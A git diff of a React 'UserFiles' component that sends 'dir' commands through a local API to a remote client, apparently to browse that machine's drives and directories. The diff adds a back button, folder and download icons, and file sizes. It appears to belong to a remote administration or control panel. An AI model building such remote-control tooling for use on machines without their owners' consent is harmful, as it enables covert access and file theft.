@@ -1,6 +1,8 @@
 import React, { useState, useEffect } from "react";
 import { Loading } from "./Loading";
 import axios from "axios";
+import { ArrowUp,Folder , Download } from "lucide-react";
+
 
 async function sendFileCommand(data) {
   const url = "http://localhost/api/commands/";
@@ -15,8 +17,11 @@ async function sendFileCommand(data) {
   }
 }
 
-export const UserFiles = ({ id }) => {
-  const [files, setFiles] = useState(null);
+function removeDirCommand(str) {
+  return str.replace(/^dir\s+/i, ""); 
+}
+
+export const UserFiles = ({ id , files, setFiles, dirHistory,setDirHistory}) => {
   const [loading, setLoading] = useState(false);
   const [fetchingId, setFetchingId] = useState(null);
 
@@ -60,14 +65,13 @@ export const UserFiles = ({ id }) => {
   const handleSendFileCommandBtn = async (id, command) => {
     const data = { client: id, command: command, temp: true };
     const result = await sendFileCommand(data);
-    console.log("Command send result:", result);
     if (!result.error) {
       setLoading(true);
       setFetchingId(result.id);
     }
+    setDirHistory((prev) => [...prev, command]); // Push current command to history
   };
 
-  console.log("Loading state:", loading, "Fetching ID:", fetchingId);
 
   if (loading) {
     return (
@@ -77,25 +81,50 @@ export const UserFiles = ({ id }) => {
     );
   }
 
-  console.log("the files are ", files);
+
 
   return (
     <div className="p-4">
-      <h3>User Files</h3>
+      
+
+      {dirHistory.length > 1 && (
+            <button
+              className="flex items-center gap-2  py-2.5 px-5 me-2 mb-2 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-full border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100 dark:focus:ring-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-600 dark:hover:text-white dark:hover:bg-gray-700"
+              onClick={() => {
+                const newHistory = [...dirHistory];
+                newHistory.pop(); // Remove current directory
+                const previousCommand = newHistory.pop() || "dir"; // Get previous command or default to "dir"
+                setDirHistory(newHistory); // Update history
+                handleSendFileCommandBtn(id, previousCommand);
+              }}
+            >   <ArrowUp className="w-4 h-4" />
+              {removeDirCommand(dirHistory[dirHistory.length - 1])}
+            </button>
+          )}
 
       {files ? (
-        <ul className="list-disc list-inside">
+        <ul className="list-none list-inside">
           {files.map((file, index) => (
             <li key={index} className="mb-2">
-              <span className="font-medium">{file.name}</span>
-              <span className="text-gray-500 ml-2">({file.entry_type})</span>
-              {file.entry_type === "directory" || file.entry_type === "drive"  && (
+              {(file.entry_type === "directory" || file.entry_type === "drive")  && (
                 <button
-                  className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded ml-4"
+                  className="flex items-center gap-2  py-2.5 px-5 me-2 mb-2 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-full border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100 dark:focus:ring-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-600 dark:hover:text-white dark:hover:bg-gray-700"
                   onClick={()=>{
                     handleSendFileCommandBtn(id, `dir ${file.path}`);
                   }}
-                  >Load</button>)
+                  
+                  > <span className="font-medium">{file.name} </span> <Folder></Folder></button>)
+              }
+              {file.entry_type === "file"  && (
+                <div className="flex items-center gap-2">
+                    
+                  <button
+                  className="flex items-center gap-2  py-2.5 px-5 me-2 mb-2 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-full border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100 dark:focus:ring-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-600 dark:hover:text-white dark:hover:bg-gray-700"
+                  > <span>{file.name}</span>  
+                  <span>({file.size} Bytes)</span> 
+                  <Download /></button>
+                </div>
+                )
               }
             </li>
           ))}
